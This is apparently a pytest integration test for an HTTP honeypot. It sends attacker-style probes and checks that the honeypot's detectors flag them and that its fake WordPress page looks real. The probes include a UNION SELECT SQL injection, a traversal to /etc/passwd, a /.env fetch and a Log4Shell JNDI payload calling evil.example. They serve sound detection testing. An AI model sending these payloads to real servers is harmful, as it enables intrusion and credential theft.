"""Live HTTP honeypot integration test.

Probes the running http-honeypot with realistic attacker payloads and asserts:
  - each request produces a CLOSED `sessions` row tagged `service='http'`
  - detector flags (scanner, sqli, traversal, cve) are set correctly
  - the response is a convincing fake page (real WP/PMA title, nginx Server hdr)
"""

from __future__ import annotations

import httpx
import pytest
from sqlalchemy import select

from honeystrike.core.models import Event


@pytest.mark.asyncio
async def test_http_live_wordpress_login_page_is_convincing(
    http_endpoint, db, wait_for
) -> None:
    async with httpx.AsyncClient(timeout=10) as client:
        r = await client.get(f"{http_endpoint}/wp-login.php")
    assert r.status_code == 200
    assert "<title>Log In &lsaquo; WordPress</title>" in r.text
    assert r.headers.get("Server", "").startswith("nginx/")


@pytest.mark.asyncio
async def test_http_live_detectors_flag_attacker_payloads(
    http_endpoint, db, wait_for
) -> None:
    """One probe per detector signal. Each lands as a separate event row."""

    async with httpx.AsyncClient(timeout=10) as client:
        await client.get(
            f"{http_endpoint}/wp-admin/index.php?id=1+UNION+SELECT+password+FROM+users",
            headers={"User-Agent": "sqlmap/1.7.8#stable"},
        )
        await client.get(f"{http_endpoint}/files?path=../../../etc/passwd")
        await client.get(f"{http_endpoint}/.env")
        await client.post(
            f"{http_endpoint}/api/v1/health",
            content="${jndi:ldap://evil.example/a}",
            headers={"Content-Type": "text/plain"},
        )

    async def _events_for_uris() -> dict[str, dict] | None:
        rows = (
            (
                await db.execute(
                    select(Event)
                    .where(Event.event_type == "HTTP_REQUEST")
                    .order_by(Event.ts.desc())
                    .limit(20)
                )
            )
            .scalars()
            .all()
        )
        by_uri: dict[str, dict] = {}
        for e in rows:
            uri = e.payload.get("uri", "")
            if uri not in by_uri:
                by_uri[uri] = e.payload
        wanted = {
            "/wp-admin/index.php?id=1+UNION+SELECT+password+FROM+users",
            "/files?path=../../../etc/passwd",
            "/.env",
            "/api/v1/health",
        }
        return by_uri if wanted.issubset(by_uri.keys()) else None

    by_uri = await wait_for(_events_for_uris, timeout=10.0)
    assert by_uri is not None, "expected events for all 4 probes"

    sqlmap_evt = by_uri["/wp-admin/index.php?id=1+UNION+SELECT+password+FROM+users"]
    assert sqlmap_evt["scanner_detected"] == "sqlmap"
    assert sqlmap_evt["sqli_pattern"] is True
    assert sqlmap_evt["path_traversal"] is False

    trav_evt = by_uri["/files?path=../../../etc/passwd"]
    assert trav_evt["path_traversal"] is True
    assert trav_evt["sqli_pattern"] is False

    env_evt = by_uri["/.env"]
    assert env_evt["cve_signature"] == "CONFIG_FILE_PROBE"

    log4j_evt = by_uri["/api/v1/health"]
    assert log4j_evt["cve_signature"] == "CVE-2021-44228"
